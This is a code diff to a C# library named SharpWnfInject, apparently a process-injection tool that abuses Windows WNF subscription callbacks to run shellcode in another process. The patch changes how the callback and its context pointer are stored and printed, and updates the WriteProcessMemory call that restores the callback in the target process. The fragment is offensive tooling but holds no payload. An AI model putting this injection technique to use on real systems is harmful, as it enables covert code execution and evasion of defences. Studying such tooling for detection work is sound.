@@ -119,7 +119,7 @@ namespace SharpWnfInject.Library
             PeProcess proc;
             bool is64bit;
             ulong stateNameToInject = 0UL;
-            IntPtr pCallback;
+            Dictionary<IntPtr, IntPtr> callback;
             IntPtr pCallbackPointer;
             IntPtr pShellcode;
             IntPtr lpNumberOfBytesWritten;
@@ -252,7 +252,7 @@ namespace SharpWnfInject.Library
                 Console.WriteLine("[+] Got {0} WNF_USER_SUBSCRIPTION(s).", userSubscriptions.Count);
             }
 
-            pCallback = userSubscriptions[userSubscriptions.Keys.First()];
+            callback = userSubscriptions[userSubscriptions.Keys.First()];
             uint nOffsetCallback;
 
             if (is64bit)
@@ -266,8 +266,12 @@ namespace SharpWnfInject.Library
                 Console.WriteLine("    |-> Address  : 0x{0}", userSubscriptions.Keys.First().ToString("X16"));
                 Console.WriteLine(
                     "    |-> Callback : 0x{0} ({1})",
-                    pCallback.ToString("X16"),
-                    Helpers.GetSymbolPath(proc.GetProcessHandle(), pCallback));
+                    callback.Keys.First().ToString("X16"),
+                    Helpers.GetSymbolPath(proc.GetProcessHandle(), callback.Keys.First()));
+                Console.WriteLine(
+                    "    |-> Context  : 0x{0} ({1})",
+                    callback[callback.Keys.First()].ToString("X16"),
+                    Helpers.GetSymbolPath(proc.GetProcessHandle(), callback[callback.Keys.First()]));
             }
             else
             {
@@ -280,8 +284,12 @@ namespace SharpWnfInject.Library
                 Console.WriteLine("    |-> Address  : 0x{0}", userSubscriptions.Keys.First().ToString("X8"));
                 Console.WriteLine(
                     "    |-> Callback : 0x{0} ({1})",
-                    pCallback.ToString("X8"),
-                    Helpers.GetSymbolPath(proc.GetProcessHandle(), pCallback));
+                    callback.Keys.First().ToString("X8"),
+                    Helpers.GetSymbolPath(proc.GetProcessHandle(), callback.Keys.First()));
+                Console.WriteLine(
+                    "    |-> Context  : 0x{0} ({1})",
+                    callback[callback.Keys.First()].ToString("X8"),
+                    Helpers.GetSymbolPath(proc.GetProcessHandle(), callback[callback.Keys.First()]));
 
                 if (Environment.Is64BitProcess)
                     Console.WriteLine("    |-> Warning  : To get detailed symbol information of WOW64 process, should be built as 32bit binary.");
@@ -383,7 +391,7 @@ namespace SharpWnfInject.Library
             if (!Win32Api.WriteProcessMemory(
                     proc.GetProcessHandle(),
                     pCallbackPointer,
-                    BitConverter.GetBytes(pCallback.ToInt64()),
+                    BitConverter.GetBytes(callback.Keys.First().ToInt64()),
                     is64bit ? 8u : 4u,
                     IntPtr.Zero))
             {
